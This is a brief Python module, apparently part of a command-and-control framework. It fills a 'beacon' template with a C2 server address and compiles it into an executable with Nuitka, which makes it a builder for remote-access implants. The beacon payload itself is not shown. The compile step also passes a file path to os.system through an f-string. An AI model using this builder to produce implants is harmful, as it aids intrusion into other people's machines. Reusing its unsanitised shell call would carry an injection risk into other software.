import os
from .beacons.generate import render_template as beacons_generate
import random
import string

import os
import tempfile

def compile_script(server, beacon_template, output, format):
    content = beacons_generate(beacon_template, c2=server)
    temp_dir = tempfile.mkdtemp()
    base_path = os.getcwd()
    output_file = os.path.join(base_path, output)
    try:
        temp_file = os.path.join(temp_dir, 'temp_script.py')
        with open(temp_file, 'w') as f:
            f.write(content)
        if format == 'exe':
            os.chdir(temp_dir)
            os.system(f'nuitka {temp_file}')
            os.rename(f'temp_script.exe', output_file)
        else:
            try:
                os.rename(temp_file, output_file)
            except Exception as e:
                print(f"Error while renaming file: {e}")

    except Exception as e:
        print(f'Error during compilation: {e}')

    finally:
        os.chdir(base_path)
        if os.path.exists(temp_dir):
            import shutil
            shutil.rmtree(temp_dir)


def generate_random_id(seed):
    random.seed(seed)
    characters = string.ascii_lowercase + string.digits
    random_id = ''.join(random.choice(characters) for _ in range(5))
    return random_id
